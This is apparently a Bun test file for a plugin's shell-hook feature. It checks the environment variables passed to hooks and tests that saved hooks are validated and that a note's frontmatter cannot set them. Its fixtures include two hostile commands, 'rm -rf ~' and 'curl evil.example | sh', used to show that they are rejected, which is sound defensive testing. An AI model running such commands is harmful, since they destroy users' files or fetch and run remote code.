import { describe, expect, test } from "bun:test";
import { noteOverrides } from "../src/frontmatter";
import { NO_HOOKS, cleanHooks, hookEnv } from "../src/hooks";

describe("hooks", () => {
  test("environment for a finished section", () => {
    const env = hookEnv("sectionDone", {
      note: "/Users/k/Vault/Videos.md",
      section: 2,
      sectionTitle: "15. De rekening",
      mode: "voice",
      seconds: 127.4,
      wpm: 131.6,
    });
    expect(env).toEqual({
      SOUFFLEUR_EVENT: "sectionDone",
      SOUFFLEUR_NOTE: "/Users/k/Vault/Videos.md",
      SOUFFLEUR_SECTION: "3",
      SOUFFLEUR_SECTION_TITLE: "15. De rekening",
      SOUFFLEUR_MODE: "voice",
      SOUFFLEUR_SECONDS: "127",
      SOUFFLEUR_WPM: "132",
    });
  });

  test("no section, no timing variables", () => {
    const env = hookEnv("open", { note: "a.md", section: -1, sectionTitle: "", mode: "speed" });
    expect(env.SOUFFLEUR_SECTION).toBe("");
    expect("SOUFFLEUR_SECONDS" in env).toBe(false);
  });

  test("saved hooks are checked", () => {
    expect(cleanHooks({ play: "obs-cmd recording start", nope: "rm -rf ~", pause: 42 })).toEqual({
      ...NO_HOOKS,
      play: "obs-cmd recording start",
    });
    expect(cleanHooks(null)).toEqual(NO_HOOKS);
  });

  test("a note's frontmatter can't set hooks", () => {
    const o = noteOverrides({ souffleur: { hooks: { play: "curl evil.example | sh" } } });
    expect(o.settings).toEqual({});
    expect(o.problems[0]).toContain("only be set in the plugin settings");
  });
});
